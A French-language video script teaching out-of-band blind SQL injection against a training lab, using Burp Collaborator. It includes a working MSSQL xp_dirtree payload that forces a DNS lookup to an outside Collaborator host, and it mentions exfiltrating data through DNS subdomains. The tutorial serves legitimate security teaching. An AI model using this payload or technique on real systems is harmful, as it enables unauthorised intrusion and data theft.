

**[Introduction]**

*Plan de la scène : Prise de vue du présentateur, avec la capture d'écran d'une application vulnérable sur l'ordinateur ou le laboratoire en fond.*

**Voix off :**  
Salut à tous et bienvenue dans cette nouvelle vidéo ! Aujourd'hui, on va explorer une technique d'exploitation assez subtile : l'injection SQL aveugle avec interactions hors bande, aussi connue sous le nom de "Out of Band SQL Injection" ou OAST. C’est une méthode qu'on peut utiliser lorsque l'application ne nous renvoie pas de réponses directes à nos attaques SQL classiques, mais où on peut encore obtenir des informations de manière détournée.

On va voir comment cette vulnérabilité peut être exploitée à l'aide de Burp Suite et son outil *Burp Collaborator*, et comment on peut exfiltrer des données via des requêtes DNS.

**[Présentation du contexte]**

*Plan de la scène : Affichage de l'interface de l'application cible vulnérable.*

**Voix off :**  
Prenons un exemple simple. Imaginons qu'on ait une application vulnérable à l'injection SQL aveugle, mais qu’elle utilise des requêtes asynchrones pour exécuter la requête SQL en arrière-plan. Cela signifie que la réponse à la requête SQL ne sera pas visible directement dans l'application. Elle continue de traiter l'utilisateur normalement, tandis que la requête SQL se fait dans un thread séparé, souvent pour analyser les cookies ou autres paramètres.

Du coup, avec ce type de fonctionnement, les méthodes classiques d'injection SQL comme les erreurs de base de données ou les délais d'exécution (temps-based blind SQL injection) ne sont plus efficaces. La réponse HTTP de l'application ne sera pas influencée par la requête SQL exécutée.

**[Pourquoi les techniques hors bande ?]**

*Plan de la scène : Transition vers une animation qui explique les techniques hors bande et DNS.*

**Voix off :**  
C’est là qu’interviennent les techniques hors bande. Ici, on va essayer de déclencher des interactions réseau, comme une requête DNS, qui nous indiqueront si notre injection a fonctionné. 

L'idée, c’est d'utiliser une interaction réseau que l'application fera en arrière-plan, souvent via DNS, pour nous signaler un résultat. Ces requêtes sont particulièrement efficaces, car elles peuvent être envoyées en dehors du flux habituel de l'application, et de nombreux serveurs autorisent ces connexions pour des raisons de fonctionnement normal. 

C'est là que *Burp Collaborator* devient un super outil, car il nous permet de détecter ces interactions réseau, en particulier les requêtes DNS, et de les analyser.

**[Présentation de Burp Collaborator]**

*Plan de la scène : Présentation de l'interface Burp Suite et de Burp Collaborator.*

**Voix off :**  
*Burp Collaborator* est un serveur fourni avec Burp Suite Professional qui nous aide à détecter et à exploiter ces interactions réseau. Quand l’application vulnérable envoie une requête DNS vers un domaine que nous contrôlons, Burp Collaborator peut capturer cette requête et nous le notifier en temps réel.

Avec cet outil, il est possible d'injecter des charges utiles dans l'application pour forcer celle-ci à effectuer des requêtes DNS vers un sous-domaine spécifique de notre serveur Collaborator. Une fois cette interaction capturée, on sait que notre injection a fonctionné.

**[Exploitation de l'injection SQL aveugle avec Burp Collaborator]**

*Plan de la scène : Affichage de l'exemple d'injection SQL dans Burp Suite.*

**Voix off :**  
Prenons maintenant un exemple concret. Disons que l'application est vulnérable à une injection SQL aveugle, et que l'on veut provoquer une requête DNS via l'injection. Sur un serveur Microsoft SQL, par exemple, on pourrait injecter une commande comme celle-ci :

```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

Cette commande va forcer la base de données à exécuter une recherche DNS pour le domaine suivant :

`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

Lorsque cette recherche DNS est envoyée, Burp Collaborator reçoit la requête et peut la capturer pour vous.

**[Réponse de Burp Collaborator]**

*Plan de la scène : Affichage de l'interface Burp Collaborator avec la notification de la requête DNS capturée.*

**Voix off :**  
Dans Burp Collaborator, vous pouvez configurer un domaine spécial, comme celui que je viens de mentionner, et vérifier si le serveur envoie bien une requête DNS vers ce domaine. Si la requête DNS apparaît, cela signifie que notre injection SQL a bien fonctionné et que l'application a interagi avec notre serveur.

**[Laboratoire et résolution du défi]**

*Plan de la scène : Passage au laboratoire avec l'application vulnérable, et démonstration de la solution.*

**Voix off :**  
Passons maintenant au laboratoire. Ce laboratoire contient une application vulnérable à l'injection SQL aveugle. L'application utilise un cookie de suivi, et chaque requête SQL est exécutée de manière asynchrone.

Le but ici est d’exploiter cette vulnérabilité pour déclencher une recherche DNS vers Burp Collaborator. Dès que vous avez reçu la notification sur votre serveur Collaborator, vous aurez résolu le défi.

**[Conseils pratiques]**

*Plan de la scène : Résumé à l'écran avec des conseils clés.*

**Voix off :**  
Quelques points importants à retenir pour exploiter l'injection SQL aveugle hors bande :
- Utilisez Burp Collaborator pour recevoir les requêtes réseau générées par l’application.
- Si l'application envoie des requêtes DNS, vous pourrez récupérer des informations sans que l'application ne vous donne directement de réponse visible.
- Les injections DNS peuvent être utilisées pour exfiltrer des données en envoyant des informations dans des sous-domaines spécifiques.

**[Conclusion]**

*Plan de la scène : Retour au présentateur pour la conclusion.*

**Voix off :**  
Et voilà ! C'est ainsi qu'on peut exploiter une vulnérabilité d'injection SQL aveugle en utilisant des interactions hors bande via Burp Collaborator. C’est une technique très puissante pour interagir avec des applications vulnérables qui ne nous offrent pas de retour visible lors des injections SQL classiques. 

Si vous avez aimé cette vidéo et trouvé ces informations utiles, n'oubliez pas de laisser un like, de vous abonner et de partager avec vos amis qui sont intéressés par la sécurité informatique. 



